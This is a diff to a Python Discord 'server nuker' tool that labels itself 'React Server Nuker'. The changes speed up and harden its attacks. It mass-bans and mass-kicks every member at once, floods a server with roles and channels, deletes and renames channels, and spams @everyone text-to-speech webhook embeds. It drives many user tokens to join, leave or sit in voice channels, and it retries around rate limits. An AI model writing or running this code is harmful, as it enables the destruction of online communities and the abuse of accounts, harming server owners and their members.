@@ -1,3 +1,5 @@
+
+from colorama.initialise import init
 import requests
 import json
 import pathlib 
@@ -7,7 +9,6 @@ import base64
 import random
 import os
 import socket
-import colorama
 import sys
 import pypresence
 import threading
@@ -17,25 +18,25 @@ import string
 import datetime
 import subprocess
 import ctypes
-import selenium
 
+from colorama import Fore , Style , init
 from selenium import webdriver
 from concurrent.futures import ThreadPoolExecutor
 
-colorama.init(autoreset=True)
+init(autoreset=True)
 lock = threading.Lock()
 
 class Colour:
 
-    YELLOW = colorama.Fore.YELLOW
-    CYAN = colorama.Fore.CYAN
-    WHITE = colorama.Fore.WHITE
-    RED = colorama.Fore.RED
-    GREEN = colorama.Fore.GREEN
-    MAGENTA = colorama.Fore.MAGENTA
-    LIGHTBLUE = colorama.Fore.LIGHTBLUE_EX
+    YELLOW = Fore.YELLOW
+    CYAN = Fore.CYAN
+    WHITE = Fore.WHITE
+    RED = Fore.RED
+    GREEN = Fore.GREEN
+    MAGENTA = Fore.MAGENTA
+    LIGHTBLUE = Fore.LIGHTBLUE_EX
 
-    BRIGHT = colorama.Style.BRIGHT
+    BRIGHT = Style.BRIGHT
 
 class URL:
     IconURL = "https://avatars.githubusercontent.com/u/70201574?v=4"
@@ -147,6 +148,7 @@ class Infomation:
 class Status:
 
     SuccessStatus = [200,201,204]
+    RatelimitStatus = [429,401]
 
     def Fail(Text):
         lock.acquire()
@@ -300,6 +302,9 @@ class ReqHeader:
             }
 
 class Data:
+    def GetUserInfoServer():
+        response = requests.get(f"{URL.BaseURL}/guilds/{Constant.SERVER_ID}/members/394447088970104833",headers=ReqHeader.DiscordHeader())
+        print(response.json())
     def GetTokenInfo():
         if Constant.TOKEN is not False:
             CC_Digits = {
@@ -494,9 +499,29 @@ class Discord:
                     "username":"React",
                     "avatar_url": URL.IconURL,
                     "content": "@everyone",
-                    "tts": "true",
+                    "tts": True,
                     "embeds": [{
                         "title": "React Server Nuker",
+                        "description": f"@everyone\n\n> {Message}",
+                        "color": random.randint(0, 16777215),
+                        "author": {
+                                "name": "React Server Nuker",
+                                "url": "https://smilewindiscord-th.web.app/joindiscord.html",
+                                "icon_url": URL.IconURL
+                            },
+                            "footer": {
+                                "text": "Nuked ~",
+                                "icon_url": URL.IconURL
+                            },
+                            "timestamp": f"{str(datetime.datetime.utcnow())}",
+                            "image": {
+                                "url": URL.IconURL
+                            },
+                            "thumbnail": {
+                                "url": URL.IconURL
+                            }
+                        },
+                        {"title": "React Server Nuker",
                         "description": f"@everyone\n\n> {Message}",
                         "color": random.randint(0, 16777215),
                         "author": {
@@ -540,13 +565,15 @@ class Discord:
         if response.status_code in Status.SuccessStatus:
             Status.Success(f"Created Role {RoleName}")
 
-        elif response.status_code == 429:
-            Status.Ratelimit(f"")
+        elif response.status_code in Status.RatelimitStatus:
+            print(response.json())
+            Status.Ratelimit(f"Ratelimit")
             time.sleep(0.05)
-            threading.Thread(target=Discord.CreateRole, args=(RoleName)).start()
+            threading.Thread(target=Discord.CreateRole, args=(str(RoleName))).start()
         
         else:
-            Status.Fail(f"Couldn't Create Channel {RoleName}")
+            print(response.json() + response.status_code)
+            Status.Fail(f"Couldn't Create Role {RoleName}")
 
     def DeleteRole(RoleID):
         response = requests.delete(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/roles/{RoleID}", headers=ReqHeader.DiscordHeader())
@@ -584,7 +611,7 @@ class Discord:
         if response.status_code in Status.SuccessStatus:
             Status.Success(f"Created Channel {ChannelName}")
         
-        elif response.status_code == 429:
+        elif response.status_code in Status.RatelimitStatus:
             Status.Ratelimit(f"Ratelimit")
             time.sleep(0.05)
             threading.Thread(target=Discord.CreateChannel, args=(ChannelName)).start()
@@ -600,8 +627,10 @@ class Discord:
             if response.status_code in Status.SuccessStatus:
                 Status.Success(f"Deleted Channel {ChannelID}")
             
-            elif response.status_code == 429:
-                Status.Ratelimit("Ratelimit")
+            elif response.status_code in Status.RatelimitStatus:
+                Status.Ratelimit(f"Ratelimit")
+                time.sleep(0.05)
+                threading.Thread(target=Discord.DeleteChannel, args=(ChannelID)).start()
 
             else:
                 print(response.json())
@@ -617,7 +646,8 @@ class Discord:
         if response.status_code in Status.SuccessStatus:
             Status.Success(f"CHANNEL NAME CHANGED")
         
-        elif response.status_code == 429:
+        elif response.status_code in Status.RatelimitStatus:
+            Status.Ratelimit(f"Ratelimit")
             time.sleep(0.05)
             threading.Thread(target=Discord.ChangeChannelName,args=(Channel, ChannelName)).start()
 
@@ -635,8 +665,8 @@ class Discord:
         if response.status_code in Status.SuccessStatus:
             Status.Success(f"Created Channel {ChannelName}")
         
-        elif response.status_code == 429:
-            Status.Ratelimit(f"")
+        elif response.status_code in Status.RatelimitStatus:
+            Status.Ratelimit(f"Ratelimit")
             time.sleep(0.05)
             threading.Thread(target=Discord.CreateCategory, args=(ChannelName)).start()
 
@@ -653,8 +683,8 @@ class Discord:
         if response.status_code in Status.SuccessStatus:
             Status.Success(f"Created Channel {ChannelName}")
         
-        elif response.status_code == 429:
-            Status.Ratelimit(f"")
+        elif response.status_code in Status.RatelimitStatus:
+            Status.Ratelimit(f"Ratelimit")
             time.sleep(0.05)
             threading.Thread(target=Discord.CreateVoiceChannel, args=(ChannelName)).start()
 
@@ -670,7 +700,8 @@ class Discord:
             if response.status_code in Status.SuccessStatus:
                 Status.Success(f"Banned {Member}")
 
-            elif response.status_code == 429:
+            elif response.status_code in Status.RatelimitStatus:
+                Status.Ratelimit(f"Ratelimit")
                 time.sleep(0.05)
                 threading.Thread(target=Discord.Ban, args=(Member)).start()
                 
@@ -689,7 +720,8 @@ class Discord:
             if response.status_code in Status.SuccessStatus:
                 Status.Success(f"{Member}")
 
-            elif response.status_code == 429:
+            elif response.status_code in Status.RatelimitStatus:
+                Status.Ratelimit(f"Ratelimit")
                 time.sleep(0.05)
                 threading.Thread(target=Discord.Kick, args=(Member)).start()
             
@@ -707,7 +739,9 @@ class Discord:
         if response.status_code in Status.SuccessStatus:
             Status.Success(f"WEBHOOK CREATED")
 
-        elif response.status_code == 429:
+        elif response.status_code in Status.RatelimitStatus:
+            Status.Ratelimit(f"Ratelimit")
+            time.sleep(0.05)
             threading.Thread(target=Discord.CreateWebhook,args=(Channel)).start()
         
         else:
@@ -718,7 +752,9 @@ class Discord:
         if response.status_code in Status.SuccessStatus:
             Status.Success(f"TOKEN : {token} JOINED")
         
-        elif response.status_code == 429:
+        elif response.status_code in Status.RatelimitStatus:
+            Status.Ratelimit(f"Ratelimit")
+            time.sleep(0.05)
             threading.Thread(target=Discord.Join,args=(token)).start()
 
         else:
@@ -729,7 +765,9 @@ class Discord:
         if response.status_code in Status.SuccessStatus:
             Status.Success(f"TOKEN : {token} LEAVE")
         
-        elif response.status_code == 429:
+        elif response.status_code in Status.RatelimitStatus:
+            Status.Ratelimit(f"Ratelimit")
+            time.sleep(0.05)
             threading.Thread(target=Discord.Leave,args=(token)).start()
         
         else:
@@ -979,7 +1017,7 @@ class ThreadFunction:
             Name = input(f"{Constant.Space}{Colour.YELLOW}Channel Name : ")
             with ThreadPoolExecutor(max_workers=len(Channels)) as executor:
                 for Channel in Channels:
-                    threads_create.append(executor.submit(Discord.ChangeChannelName,str(Channel),Name))
+                    threads_create.append(executor.submit(Discord.ChangeChannelName,str(Channel),str(Name),))
     
     def ThreadCreateRole():
         if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
@@ -989,7 +1027,7 @@ class ThreadFunction:
             with ThreadPoolExecutor(max_workers=Num) as executor:
                 for i in range(Num):
                     time.sleep(0.045)
-                    threads_create.append(executor.submit(Discord.CreateRole,Name,))
+                    threads_create.append(executor.submit(Discord.CreateRole,str(Name),))
     
     def ThreadDeleteRole():
         if Constant.TOKEN is not False:
@@ -1007,7 +1045,7 @@ class ThreadFunction:
             with ThreadPoolExecutor(max_workers=Num) as executor:
                 for i in range(Num):
                     time.sleep(0.045)
-                    threads_create.append(executor.submit(Discord.CreateCategory,Name,))
+                    threads_create.append(executor.submit(Discord.CreateCategory,str(Name),))
     
     def ThreadCreateVoice():
         if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
@@ -1017,7 +1055,7 @@ class ThreadFunction:
             with ThreadPoolExecutor(max_workers=Num) as executor:
                 for i in range(Num):
                     time.sleep(0.045)
-                    threads_create.append(executor.submit(Discord.CreateVoiceChannel,Name,))
+                    threads_create.append(executor.submit(Discord.CreateVoiceChannel,str(Name),))
             
     def ThreadCreateChannel():
         if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
@@ -1056,7 +1094,6 @@ class ThreadFunction:
             Threads =[] 
             Message = input(f"{Constant.Space}{Colour.YELLOW}>")
 
-
             try:
                 
                 for i in range(int(input(f"{Constant.Space}{Colour.YELLOW}>"))):
@@ -1077,98 +1114,23 @@ class ThreadFunction:
     def ThreadKick():
         if Constant.TOKEN is True and Constant.SERVER_ID is True:
             Members = Data.GetMember_ID()
-            
-            Member_1 = []
-            Member_2 = []
-            Member_3 = []
-            Member_4 = []
+            threads_create = []
+            with ThreadPoolExecutor(max_workers=len(Members)) as executor:
+                for Member in Members:
+                    threads_create.append(executor.submit(Discord.Kick,str(Member),))
 
-            for Member in Members:
-                if len(Member_1) != round(len(Members)/4):
-                    Member_1.append(Member)
-                
-                elif len(Member_2) != round(len(Members)/4):
-                    Member_2.append(Member)
-                
-                elif len(Member_3) != round(len(Members)/4):
-                    Member_3.append(Member)
-                
-                elif len(Member_4) != round(len(Members)/4):
-                    Member_4.append(Member)
-                
-                else:
-                    pass
-                
-            while True:
-                try:
-                    threading.Thread(target=Discord.Kick, args=(Member_1[num])).start()
-                    threading.Thread(target=Discord.Kick, args=(Member_2[num])).start()
-                    threading.Thread(target=Discord.Kick, args=(Member_3[num])).start()
-                    threading.Thread(target=Discord.Kick, args=(Member_4[num])).start()
-
-                except IndexError:
-                    break
-
-                except:
-                    pass
-
-                try:
-                    threading.Thread(target=Discord.Kick, args=(Member_4[num])).start()
-
-                except IndexError:
-                    break
-
-                except:
-                    pass
-
-                num = num + 1
-        
         else:
             print("")
 
     def ThreadBan():
         if Constant.TOKEN is True and Constant.SERVER_ID is True:
             Members = Data.GetMember_ID()
-            
-            Member_1 = []
-            Member_2 = []
-            Member_3 = []
-            Member_4 = []
-
-            for Member in Members:
-                if len(Member_1) != round(len(Members)/4):
-                    Member_1.append(Member)
-                
-                elif len(Member_2) != round(len(Members)/4):
-                    Member_2.append(Member)
-                
-                elif len(Member_3) != round(len(Members)/4):
-                    Member_3.append(Member)
-                
-                elif len(Member_4) != round(len(Members)/4):
-                    Member_4.append(Member)
-                
-                else:
-                    pass
-            
-            while num > round(len(Members/4)):
-                try:
-                    threading.Thread(target=Discord.Ban, args=(Member_1[num])).start()
-                    threading.Thread(target=Discord.Ban, args=(Member_2[num])).start()
-                    threading.Thread(target=Discord.Ban, args=(Member_3[num])).start()
-                    threading.Thread(target=Discord.Ban, args=(Member_4[num])).start()
-                    num = num + 1
-
-                except IndexError:
-                    break
-
-                except:
-                    pass 
-        
+            threads_create = []
+            with ThreadPoolExecutor(max_workers=len(Members)) as executor:
+                for Member in Members:
+                    threads_create.append(executor.submit(Discord.Ban,str(Member),))
         else:
             print("")
-
-
     def ThreadLivestream():
         if Constant.SERVER_ID is not False:
 
@@ -1176,7 +1138,7 @@ class ThreadFunction:
             threads_create = [] 
             with ThreadPoolExecutor(max_workers=len(Constant.TOKENS)) as executor:
                 for token in Constant.TOKENS:
-                    threads_create.append(executor.submit(Discord.Livestream,token,VOICE_ID,))
+                    threads_create.append(executor.submit(Discord.Livestream,(token),str(VOICE_ID),))
         
         else:
             print("") 
@@ -1187,7 +1149,7 @@ class ThreadFunction:
             threads_create = [] 
             with ThreadPoolExecutor(max_workers=len(Constant.TOKENS)) as executor:
                 for token in Constant.TOKENS:
-                    threads_create.append(executor.submit(Discord.Connect,token,VOICE_ID,))
+                    threads_create.append(executor.submit(Discord.Connect,(token),str(VOICE_ID),))
 
         else:
             pass
@@ -1199,7 +1161,7 @@ class ThreadFunction:
             threads_create = [] 
             with ThreadPoolExecutor(max_workers=len(Constant.TOKENS)) as executor:
                 for token in Constant.TOKENS:
-                    threads_create.append(executor.submit(Discord.Online,token,Type,Game,))
+                    threads_create.append(executor.submit(Discord.Online,(token),(Type),(Game),))
         else:
             print("")
 
@@ -1239,9 +1201,9 @@ class Main:
         31: ["","Nuke Server","Nuke Server"],
         32: [Data.GetTokenInfo,"Token Info",""],
         33: [Discord.CopyServer,"Copy Server",""],
-        34: ["","",""],
+        34: [Data.GetUserInfoServer,"",""],
         35: ["","",""],
-        36: [exit,"Exit","ออก"]
+        36: [sys.exit,"Exit","ออก"]
     }
 
     def run(Run =False):
@@ -1298,5 +1260,6 @@ def start(START=False):
     else:
         print(f"{Constant.Space}Unable to run")
 
+#run script
 if __name__ == "__main__":
     start(Constant.START)
